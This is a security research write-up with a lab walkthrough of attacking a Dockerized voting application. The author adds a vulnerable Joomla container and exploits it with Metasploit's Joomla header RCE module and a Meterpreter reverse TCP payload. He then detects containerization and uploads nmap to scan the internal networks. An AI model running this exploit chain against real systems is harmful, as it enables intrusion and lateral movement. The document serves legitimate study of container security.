### An Attacker Looks at Docker: Approaching Multi-Container Applications

#### Application Overview
The example application consists of the following components:
- A Python web interface for casting votes
- A Redis server that collects the votes
- A .NET worker that takes votes from Redis and inserts them into a database
- A PostgreSQL database server
- A Node.js web interface for viewing results

While this is a simplified and contrived example, it illustrates the concept of developing a larger application as a collection of smaller, loosely coupled services. These services can be written in different languages and environments, as long as they can communicate using standard protocols. This setup allows for a more detailed examination in the context of this work.

#### Advantages and Security Concerns
There are many advantages to this microservices architecture, but for the purposes of this paper, we are more concerned with how an attacker might view the application after compromising some aspect of it. For our mock operation, we will modify the voting application to include a vulnerable Joomla instance. Once we gain access to the networks within the multi-container application, we will explore how it can be further exploited and manipulated.

#### Target Application Setup
For the demonstration, we add the Joomla target container to the `docker-compose.yml` file, which describes the layout of the application.

```yaml
version: "3"
services:
  vote:
    build: ./vote
    command: python app.py
    volumes:
      - ./vote:/app
    ports:
      - "5001:80"
    networks:
      - front-tier
      - back-tier
  result:
    build: ./result
    command: nodemon server.js
    volumes:
      - ./result:/app
    ports:
      - "5002:80"
      - "5858:5858"
    networks:
      - front-tier
      - back-tier
  joomla:
    image: joomla_target
    ports:
      - "80:80"
    networks:
      - front-tier
      - back-tier
  worker:
    build:
      context: ./worker
    depends_on:
      - redis
    networks:
      - back-tier
  redis:
    image: redis:alpine
    container_name: redis
    ports:
      - "6379"
    networks:
      - back-tier
  db:
    image: postgres:9.4
    container_name: db
    volumes:
      - db-data:/var/lib/postgresql/data
    networks:
      - back-tier
volumes:
  db-data:
networks:
  front-tier:
  back-tier:
```

The voting application has two networks, and like the other front-end containers, we give the Joomla container access to both networks and expose a port to the host for interaction. Port numbers for the voting and results applications have been shifted to avoid conflicts with a locally-running Docker registry container. The `docker-compose up` command can be used to build and start the entire multi-container application, and we can see the exposed interfaces.

#### Attacker Setup
We position the attacker outside of the voting application by creating a separate network in which we run a Kali Linux container with the Metasploit Framework installed. Ports on the external attack surface of the voting application will be accessible by the attacker on the attacker’s network’s default gateway. The internal networks of the target application will only be accessible via pivoting through the initial compromise of the Joomla container.

```bash
wes@lappy:~$ docker run --network attacker -p 4000:4000 -it metasploit /bin/bash
root@dcdd01356172:/# service postgresql start
[ ok ] Starting PostgreSQL 10 database server: main.
root@dcdd01356172:/# msfconsole -q
msf > ip a
[*] exec: ip a
1: lo:  mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
127: eth0@if128:  mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:13:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.19.0.2/16 brd 172.19.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

#### Exploitation
We can now set up the attack on the Joomla target:

```bash
msf > use exploit/multi/http/joomla_http_header_rce
msf exploit(multi/http/joomla_http_header_rce) > set RHOST 172.19.0.1
RHOST => 172.19.0.1
msf exploit(multi/http/joomla_http_header_rce) > set PAYLOAD php/meterpreter/reverse_tcp
PAYLOAD => php/meterpreter/reverse_tcp
msf exploit(multi/http/joomla_http_header_rce) > set LHOST 10.41.48.192
LHOST => 10.41.48.192
msf exploit(multi/http/joomla_http_header_rce) > set LPORT 4000
LPORT => 4000
msf exploit(multi/http/joomla_http_header_rce) > run
[-] Handler failed to bind to 10.41.48.192:4000:-  -
[*] Started reverse TCP handler on 0.0.0.0:4000
[*] 172.19.0.1:80 - Sending payload ...
[*] Sending stage (37543 bytes) to 172.19.0.1
[*] Meterpreter session 1 opened (172.19.0.2:4000 -> 172.19.0.1:60342) at 2018-01-30 15:46:41 +0000
meterpreter > sysinfo
Computer    : a3f280146222
OS          : Linux a3f280146222 4.13.0-32-generic #35-Ubuntu SMP Thu Jan 25 09:13:46 UTC 2018 x86_64
Meterpreter : php/linux
```

#### Identifying Containerization
An attacker might not know they are attacking a containerized application until the initial compromise is successful. Containers are typically minimal and have very few processes running within their context. Indications of containerization include the presence of a `.dockerenv` file in the root directory and indications of Docker in `/proc/1/cgroup`:

```bash
meterpreter > shell
Process 64 created.
Channel 6 created.
cat /proc/1/cgroup
12:blkio:/docker/a3f2801462229e76208c283c9f2e5c0860b4dcbcac9dbe35f7236116df35524b
11:perf_event:/docker/a3f2801462229e76208c283c9f2e5c0860b4dcbcac9dbe35f7236116df35524b
10:devices:/docker/a3f2801462229e76208c283c9f2e5c0860b4dcbcac9dbe35f7236116df35524b
9:cpuset:/docker/a3f2801462229e76208c283c9f2e5c0860b4dcbcac9dbe35f7236116df35524b
8:memory:/docker/a3f2801462229e76208c283c9f2e5c0860b4dcbcac9dbe35f7236116df35524b
7:net_cls,net_prio:/docker/a3f2801462229e76208c283c9f2e5c0860b4dcbcac9dbe35f7236116df35524b
6:pids:/docker/a3f2801462229e76208c283c9f2e5c0860b4dcbcac9dbe35f7236116df35524b
5:hugetlb:/docker/a3f2801462229e76208c283c9f2e5c0860b4dcbcac9dbe35f7236116df35524b
4:rdma:/
3:freezer:/docker/a3f2801462229e76208c283c9f2e5c0860b4dcbcac9dbe35f7236116df35524b
2:cpu,cpuacct:/docker/a3f2801462229e76208c283c9f2e5c0860b4dcbcac9dbe35f7236116df35524b
1:name=systemd:/docker/a3f2801462229e76208c283c9f2e5c0860b4dcbcac9dbe35f7236116df35524b
0::/system.slice/docker.service
```

#### Exploring the Multi-Container Network
We can see that the compromised container has network interfaces on more than one network. This indicates that the container is likely part of a multi-container application. The attacker needs to conduct a scan for other containers on these networks.

```bash
ip a
1: lo:  mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
115: eth1@if116:  mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:14:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.20.0.3/16 brd 172.20.255.255 scope global eth1
       valid_lft forever preferred_lft forever
123: eth0@if124:  mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:15:00:06 brd ff:ff:ff:ff:ff:ff
    inet 172.21.0.6/16 brd 172.21.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

As a non-root user (www-data) running the PHP Meterpreter, we are somewhat limited in post-exploitation actions. However, we can transfer a statically compiled `nmap` binary to map out the rest of the application's containers.

```bash
meterpreter > background
[*] Backgrounding session 1...
msf exploit(multi/http/joomla_http_header_rce) > curl -O https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/nmap
[*] exec: curl -O https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/nmap
 % Total   % Received % Xferd  Average Speed   Time    Time    Time  Current
                               Dload   Upload  Total   Spent   Left  Speed
100 5805k 100 5805k    0    0  2315k     0   0:00:02 0:00:02 --:--:-- 2315k
msf exploit(multi/http/joomla_http_header_rce) > sessions -i 1
[*] Starting interaction with 1...
meterpreter > upload nmap /tmp
[*] uploading  : nmap -> /tmp
[*] uploaded   : nmap -> /tmp/nmap
meterpreter > shell
Process 35 created.
Channel 2 created.
cd /tmp
chmod 755 nmap
./nmap -sT -p1-65535 172.20.0.1-10
/bin/sh: 1: ./nmap: not found
cd tmp
./nmap -sT -p1-65535 172.20.0.1-10
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-01-30 19:45 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for lappy (172.20.0.1)
Host is up (0.00030s latency).
Not shown: 65525 closed ports
PORT      STATE SERVICE
80/tcp    open  http
443/tcp   open  https
902/tcp   open  unknown
4000/tcp  open  unknown
5000/tcp  open  unknown
```

This concludes the exploration and exploitation of the multi-container application. Further steps would involve pivoting to other containers and expanding the attack surface.

---

**Wesley McGrew**
**HORNE Cyber**
**Contact: [HORNECyber.com](http://HORNECyber.com)**